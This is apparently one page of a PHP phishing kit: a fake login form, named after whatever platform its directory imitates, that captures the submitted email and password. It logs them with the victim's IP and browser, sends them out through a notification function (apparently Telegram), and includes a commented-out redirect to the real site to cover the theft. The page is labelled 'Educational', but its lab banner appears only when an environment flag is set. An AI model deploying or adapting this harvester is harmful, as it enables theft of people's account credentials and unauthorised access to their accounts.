<?php
require_once __DIR__ . '/../logger.php';

// Capture POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$pass  = isset($_POST['pass']) ? trim($_POST['pass']) : '';

// Simple sanitization
$email = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
$pass  = htmlspecialchars($pass, ENT_QUOTES, 'UTF-8');

if ($email !== '' && $pass !== '') {
    $platform = basename(__DIR__);
    $data = [
        'platform'   => $platform,
        'email'      => $email,
        'password'   => $pass,
        'source_ip'  => $_SERVER['REMOTE_ADDR'] ?? '',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    ];
    log_event('credential', $data);
    $msg = "[{$platform}] Credential captured: {$email} / {$pass}";
    tg_notify($msg);
    // Redirect to the real site after capturing credentials (optional)
    // header('Location: https://'.$platform.'.com/');
    // exit();
}
?>
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<?php if (getenv('LAB_MODE') === '1'): ?>
<div style="background:#ffcccc;color:#b00;padding:8px;text-align:center;font-weight:bold;">
[LAB MODE] This page is for educational testing only.
</div>
<?php endif; ?>
<h2>Login Page (Educational)</h2>
<form method="post" action="">
    <label>Email: <input type="email" name="email" required></label><br>
    <label>Password: <input type="password" name="pass" required></label><br>
    <button type="submit">Login</button>
</form>
</body>
</html>
